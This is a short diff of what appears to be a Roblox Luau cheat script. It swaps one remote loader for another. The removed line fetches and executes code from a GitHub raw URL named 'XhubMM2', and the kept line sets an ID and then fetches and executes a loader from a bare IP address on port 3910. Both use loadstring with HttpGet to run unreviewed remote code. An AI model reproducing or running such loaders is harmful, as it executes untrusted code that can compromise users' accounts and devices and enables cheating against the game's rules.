@@ -1,4 +1,2 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Au0yX/Community/main/XhubMM2"))()
-
 ID="b204277b-39f2-4fc2-b6e3-bda0c116741b";
 loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
